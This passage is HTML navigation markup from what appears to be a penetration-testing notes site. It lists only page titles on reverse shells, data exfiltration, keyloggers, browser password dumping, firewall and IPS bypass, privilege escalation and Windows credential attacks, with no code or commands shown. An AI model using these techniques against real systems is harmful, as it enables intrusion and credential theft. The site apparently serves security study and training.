    Coding a http reverse shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-a-low-level-data-exfiltration-tcp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Coding a data exfiltration script for a TCP reverse shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-a-data-exfiltration-script-http-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Coding a data exfiltration script for a http server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/tunning-the-connection-attemps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tunning the connection attempts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/including-cd-command-into-tcp-reverse-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Including cd command into TCP reverse shell
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_3" >
        
          
          <label class="md-nav__link" for="__nav_12_3_3" id="__nav_12_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Advanced scriptable shells
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_3">
            <span class="md-nav__icon md-icon"></span>
            Advanced scriptable shells
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/ddns-aware-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Using a Dynamic DNS instead of your bared attacker public ip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/making-your-binary-persistent/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Making your binary persistent
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/making-a-screenshot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Making a screenshot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-a-reverse-shell-that-searches-files/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Coding a reverse shell that searches files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-a-reverse-shell-that-scans-ports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Coding a reverse shell that scans ports
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_4" >
        
          
          <label class="md-nav__link" for="__nav_12_3_4" id="__nav_12_3_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Techniques for bypassing filters
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_4">
            <span class="md-nav__icon md-icon"></span>
            Techniques for bypassing filters
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/hickjack-internet-explorer-process-to-bypass-an-host-based-firewall/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hickjack the Internet Explorer process to bypass an host based firewall
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/bypassing-next-generation-firewalls/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bypassing Next Generation Firewalls
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/bypassing-ips-with-handmade-xor-encryption/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bypassing IPS with XOR encryption
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_5" >
        
          
          <label class="md-nav__link" for="__nav_12_3_5" id="__nav_12_3_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Malware and crytography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_5">
            <span class="md-nav__icon md-icon"></span>
            Malware and crytography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/tcp-reverse-shell-with-aes-encryption/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Building a TCP reverse shell with AES encryption
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/tcp-reverse-shell-with-rsa-encryption/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Building a TCP reverse shell with RSA encryption
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/tcp-reverse-shell-with-hybrid-encryption-rsa-aes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Building a TCP reverse shell with hybrid encryption
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_6" >
        
          
          <label class="md-nav__link" for="__nav_12_3_6" id="__nav_12_3_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Password Hickjacking
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_6">
            <span class="md-nav__icon md-icon"></span>
            Password Hickjacking
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/python-keylogger/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Simple keylogger in python
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/hijacking-keepass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hijacking Keepass Password Manager
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/dumping-chrome-saved-passwords/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dumping saved passwords from Google Chrome
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/man-in-the-browser-attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Man in the browser attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/dns-poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS Poisoning
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_7" >
        
          
          <label class="md-nav__link" for="__nav_12_3_7" id="__nav_12_3_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_7">
            <span class="md-nav__icon md-icon"></span>
            Privilege escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Weak service file permission
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
        
          
          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting Linux
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_13">
            <span class="md-nav__icon md-icon"></span>
            Pentesting Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    General notes
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13_2" >
        
          
          <label class="md-nav__link" for="__nav_13_2" id="__nav_13_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_13_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_13_2">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../index-linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../configuration-files/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Configuration files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crack-sensitive-files/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Crack sensitive files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cron-jobs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cron jobs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dirty-cow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dirty cow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kernel-vulnerability-exploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kernel vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lxd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lxd privilege escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../process-capabilities-getcap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Process capabilities getcap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssh-keys/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSH keys
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../suid-binaries/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Suid binaries
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13_2_11" >
        
          
          <label class="md-nav__link" for="__nav_13_2_11" id="__nav_13_2_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tools
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_13_2_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_13_2_11">
            <span class="md-nav__icon md-icon"></span>
            Tools
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux-privilege-checker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Enumerate with Linux Privilege Checker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux-exploit-suggester/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux Exploit Suggester
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
        
          
          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting Infrastructure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_14">
            <span class="md-nav__icon md-icon"></span>
            Pentesting Infrastructure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../honeypots/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Honeypots
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14_2" >
        
          
          <label class="md-nav__link" for="__nav_14_2" id="__nav_14_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_14_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_14_2">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14_2_2" >
        
          
          <label class="md-nav__link" for="__nav_14_2_2" id="__nav_14_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    From Linux
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_14_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_14_2_2">
            <span class="md-nav__icon md-icon"></span>
            From Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux-in-active-directory/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux in Active Directory
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-linux-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-linux-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-linux-lateral-movement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lateral Movement
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14_2_3" >
        
          
          <label class="md-nav__link" for="__nav_14_2_3" id="__nav_14_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    From Windows
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_14_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_14_2_3">
            <span class="md-nav__icon md-icon"></span>
            From Windows
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-windows-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-connections/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Connecting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-windows-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-windows-lateral-movement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lateral movement
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-from-windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Privilege escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hardening-auditing-active-directory/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hardening and auditing Active Directory
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../active-directory-security-identifiers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Resources
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lateral-movements/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lateral movements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pivoting-tunneling-portforwarding/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
        
          
          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting Windows
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15">
            <span class="md-nav__icon md-icon"></span>
            Pentesting Windows
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-footprinting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Footprinting windows
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-credentials-storage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credentials storage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15_3" >
        
          
          <label class="md-nav__link" for="__nav_15_3" id="__nav_15_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Attacks
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_15_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15_3">
            <span class="md-nav__icon md-icon"></span>
            Attacks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../arp-poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ARP Poisoning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attacking-lsass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking LSASS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attacking-sam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking SAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../invoke-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Invoke the hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nopac-sam-account-spoofing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoPac SAM account spoofing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-null-session-attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Null session attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pass-the-ticket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the ticket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../printnightmare/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintNightmare
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15_4" >
        
          
          <label class="md-nav__link" for="__nav_15_4" id="__nav_15_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_15_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15_4">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../index-windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index of Privilege escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../access-control-list-abuse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access Control List Abuse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attacking-domain-trusts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trusts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attacking-ntds/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking NTDS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-privilege-escalation-history/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access to history of access to files or commands
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-binaries/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows binaries
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15_5" >
        
          
          <label class="md-nav__link" for="__nav_15_5" id="__nav_15_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_15_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15_5">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../create-a-registry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Create a Registry
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../computer-forensic-fundamentals/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forensic
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-engineering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse engineering
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../wireless-security/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wireless security
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../files/index-of-files/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Downloads
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#getting-started" class="md-nav__link">
    <span class="md-ellipsis">
      Getting Started
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getting Started">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pentesting-basics" class="md-nav__link">
    <span class="md-ellipsis">
      Pentesting Basics
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pentesting Basics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#service-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Service scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Web Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#public-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Public Exploits
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-your-first-box" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking your first box
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking your first box">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nibbles-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Nibbles - Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nibbles-initial-foothold" class="md-nav__link">
    <span class="md-ellipsis">
